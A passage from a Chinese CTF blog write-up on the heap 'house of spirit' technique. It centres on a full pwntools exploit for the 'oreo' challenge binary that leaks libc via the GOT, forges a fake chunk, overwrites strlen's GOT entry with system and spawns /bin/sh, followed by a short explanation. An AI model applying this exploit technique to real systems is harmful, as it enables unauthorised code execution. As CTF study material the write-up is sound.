<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./oreo"</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./oreo"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>

<span class="c1"># address
</span><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
<span class="n">printf_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_libc</span><span class="p">))</span>
<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc</span><span class="p">))</span>
<span class="n">message_addr</span> <span class="o">=</span> <span class="mh">0x0804a2a8</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"message_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">message_addr</span><span class="p">))</span>
<span class="n">strlen_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"strlen_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">desc</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_refles</span><span class="p">():</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leave_message</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_addr</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="s">'b'</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
    
    <span class="c1"># add refle and overwrite the prev_riles
</span>    <span class="n">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>

    <span class="c1"># leak printf_addr
</span>    <span class="n">show_refles</span><span class="p">()</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
    <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">printf_addr</span>

<span class="k">def</span> <span class="nf">get_system_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">libc_addr</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_libc</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">system_addr</span>

<span class="k">def</span> <span class="nf">fake_chunk</span><span class="p">():</span>
    <span class="c1"># We need to make the size of chunk 0x41
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">add_refles</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"fuck u"</span><span class="p">)</span>

    <span class="c1"># make a chunk to set the house into link
</span>    <span class="n">name</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">message_addr</span><span class="p">)</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="s">"fuck U!"</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
    <span class="n">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">order_refles</span><span class="p">():</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">()</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">get_system_addr</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span> <span class="n">printf_libc</span><span class="p">)</span>
    <span class="n">fake_chunk</span><span class="p">()</span>

    <span class="c1"># The padding's length is from message to the next chunk size 
</span>    <span class="c1"># padding = padding * (0xa0 + 0x40 - 0xc0 + 4) + p32(0x41) 
</span>    <span class="n">padding</span><span class="o">=</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
    <span class="n">leave_message</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
    <span class="n">order_refles</span><span class="p">()</span>

    <span class="n">show_refles</span><span class="p">()</span>
    <span class="c1"># Overwrite the strlen_got
</span>    <span class="n">name</span> <span class="o">=</span> <span class="s">'fuck U~'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">)</span>
    <span class="n">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>

    <span class="n">leave_message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span> <span class="s">";/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

    <span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>  这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传<code class="language-plaintext highlighter-rouge">p32(system_addr) + ";/bin/sh\x00"</code>.因为,在strlen被覆盖之后，会执行<code class="language-plaintext highlighter-rouge">addEnd()</code>函数，相当于<code class="language-plaintext highlighter-rouge">strlen(p32(system_addr) + ";/bin/sh\x00".)</code>即<code class="language-plaintext highlighter-rouge">system(p32(system_addr)) 和 system("/bin/sh\x00")</code>这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入<code class="language-plaintext highlighter-rouge">/bin/sh</code>也可getshell。</p>

<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/oreo.png?raw=true" alt="shell" /></p>



<div id="vcomments"></div>
<script>
  new Valine({
    el: '#vcomments',
    appId: '9PQd0VOdLBtIrk7DuYhbXgo1-gzGzoHsz',
    appKey: '0tooNX9XI400l94QiuBP0lXm',

    avatar:'robohash',
    visitor: true, // 阅读量统计
    enableQQ: true
  })
</script>

<!-- id 将作为查询条件 -->
<span id=/blog/house-of-spirit class="leancloud_visitors" data-flag-title="Your Article Title">
  <em class="post-meta-item-text">阅读量 </em>
  <i class="leancloud-visitors-count"></i>
</span>

</div>
  </main>

  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>dyf</strong>
  </small>

  <div class="container-fluid justify-content-center">

</div><small id="attribution">
    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
  </small>
  
</footer>
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>

</body>

</html>